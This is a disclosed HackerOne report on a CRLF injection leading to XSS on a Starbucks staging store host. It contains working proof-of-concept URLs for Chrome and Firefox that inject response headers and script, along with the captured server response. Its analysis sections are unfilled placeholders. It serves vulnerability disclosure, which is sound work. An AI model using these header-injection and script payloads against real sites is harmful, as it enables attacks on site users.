---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '192667'
original_report_id: '192667'
title: '[stagecafrstore.starbucks.com] CRLF Injection, XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2016-12-20T08:42:53.161Z'
disclosed_at: '2018-01-22T22:31:42.805Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 25
asset_identifier: Other assets
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [stagecafrstore.starbucks.com] CRLF Injection, XSS

## Metadata

- HackerOne Report ID: 192667
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2018-01-22T22:31:42.805Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Chrome PoC**
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
```

**FireFox PoC**
```
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```

**HTTP Response**
```http
HTTP/1.1 301 Content-moved
Date: Tue, 20 Dec 2016 08:40:11 GMT
Server: WebServer
X-Original-link: /%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
X-XSS-Protection: 0
Location: //x:1
Content-Type: text/html
Content-Length: 98

<script>alert(document.domain)</script>
Content-Length: 0
X-OneLinkServiceType: onelink.fcgi
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
